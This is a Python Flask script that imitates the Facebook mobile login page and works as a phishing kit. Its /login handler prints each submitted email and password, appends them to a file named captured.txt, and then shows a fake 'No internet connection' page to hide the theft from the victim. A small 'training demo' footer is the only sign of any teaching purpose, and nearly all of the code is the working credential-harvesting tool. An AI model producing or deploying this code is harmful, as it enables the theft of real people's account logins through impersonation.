from flask import Flask, request, render_template_string

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Facebook</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}
body {
    background: #fff;
    color: #1c1e21;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}
.top-banner {
    background: #f0f2f5;
    padding: 10px 16px;
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 14px;
    color: #1877f2;
    border-bottom: 1px solid #dddfe2;
}
.top-banner svg {
    width: 20px;
    height: 20px;
    fill: #1877f2;
}
.header {
    padding: 12px 16px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}
.back-btn {
    font-size: 24px;
    color: #1c1e21;
    text-decoration: none;
}
.lang {
    font-size: 15px;
    color: #1c1e21;
}
.main {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 20px 16px 40px;
}
.fb-logo {
    width: 62px;
    height: 62px;
    background: #1877f2;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 30px 0 40px;
}
.fb-logo span {
    color: white;
    font-size: 42px;
    font-weight: bold;
    font-family: Arial, sans-serif;
    line-height: 1;
    margin-top: -4px;
}
.form {
    width: 100%;
    max-width: 400px;
}
input {
    width: 100%;
    padding: 14px 16px;
    margin-bottom: 12px;
    border: 1px solid #dddfe2;
    border-radius: 24px;
    font-size: 17px;
    background: #fff;
    outline: none;
}
input:focus {
    border-color: #1877f2;
}
.login-btn {
    width: 100%;
    padding: 14px;
    background: #1877f2;
    color: white;
    border: none;
    border-radius: 24px;
    font-size: 18px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
}
.login-btn:active {
    background: #166fe5;
}
.forgot {
    display: block;
    text-align: center;
    margin: 20px 0 30px;
    color: #1c1e21;
    font-size: 15px;
    text-decoration: none;
    font-weight: 500;
}
.create-btn {
    width: 100%;
    padding: 12px;
    background: transparent;
    color: #1877f2;
    border: 1.5px solid #1877f2;
    border-radius: 24px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 10px;
}
.meta {
    margin-top: 50px;
    text-align: center;
    color: #65676b;
    font-size: 15px;
    font-weight: 500;
}
.meta span {
    font-size: 20px;
    margin-right: 4px;
}
.training-notice {
    position: fixed;
    bottom: 10px;
    left: 0;
    right: 0;
    text-align: center;
    font-size: 11px;
    color: #8a8d91;
    background: rgba(255,255,255,0.9);
    padding: 6px;
}
</style>
</head>
<body>

<div class="top-banner">
    <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
    Get Facebook for Android and browse faster.
</div>

<div class="header">
    <a href="#" class="back-btn">←</a>
    <div class="lang">English (US)</div>
</div>

<div class="main">
    <div class="fb-logo">
        <span>f</span>
    </div>

    <form class="form" method="POST" action="/login">
        <input type="text" 
               name="email" 
               placeholder="Mobile number or email" 
               required
               autocomplete="username">

        <input type="password" 
               name="password" 
               placeholder="Password" 
               required
               autocomplete="current-password">

        <button type="submit" class="login-btn">Log in</button>
    </form>

    <a href="#" class="forgot">Forgot password?</a>

    <button class="create-btn">Create new account</button>

    <div class="meta">
        <span>∞</span> Meta
    </div>
</div>

<div class="training-notice">
    TRAINING DEMO • Credentials only printed in Termux
</div>

</body>
</html>
"""

# ========== NO INTERNET CONNECTION PAGE ==========
NO_INTERNET_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<title>Facebook</title>
<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}
body {
    background: #fff;
    color: #1c1e21;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
    text-align: center;
}
.icon {
    width: 80px;
    height: 80px;
    margin-bottom: 24px;
    opacity: 0.7;
}
h1 {
    font-size: 22px;
    font-weight: 600;
    margin-bottom: 12px;
    color: #1c1e21;
}
p {
    font-size: 16px;
    color: #65676b;
    line-height: 1.5;
    max-width: 300px;
    margin-bottom: 30px;
}
.retry-btn {
    background: #1877f2;
    color: white;
    border: none;
    border-radius: 8px;
    padding: 12px 40px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
}
.retry-btn:active {
    background: #166fe5;
}
.small {
    margin-top: 40px;
    font-size: 13px;
    color: #8a8d91;
}
</style>
</head>
<body>

<!-- Offline icon (simple SVG) -->
<svg class="icon" viewBox="0 0 24 24" fill="none" stroke="#65676b" stroke-width="1.5">
    <path d="M1 1l22 22M16.72 11.06A10.94 10.94 0 0 1 19 12.55M5 12.55a10.94 10.94 0 0 1 5.17-2.39M10.71 5.05A16 16 0 0 1 22.58 9M1.42 9a15.91 15.91 0 0 1 4.7-2.88M8.53 16.11a6 6 0 0 1 6.95 0M12 20h.01"/>
</svg>

<h1>No internet connection</h1>
<p>Please check your connection and try again.</p>

<button class="retry-btn" onclick="window.location.href='/'">Try Again</button>

<div class="small">Facebook</div>

</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML)

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email", "")
    password = request.form.get("password", "")

    # ===== Still prints in Termux =====
    print("\n" + "="*50)
    print("  TRAINING DEMO – CREDENTIALS CAPTURED")
    print("="*50)
    print(f"  Mobile/Email : {email}")
    print(f"  Password     : {password}")
    print("="*50 + "\n")

    # Save to file
    with open("captured.txt", "a") as f:
        f.write(f"Mobile/Email: {email} | Password: {password}\n")

    # Show the realistic "No internet" page instead of training message
    return NO_INTERNET_HTML

if __name__ == "__main__":
    print("Starting Facebook-style training demo...")
    print("Open: http://127.0.0.1:5000")
    app.run(host="0.0.0.0", port=5000, debug=False)
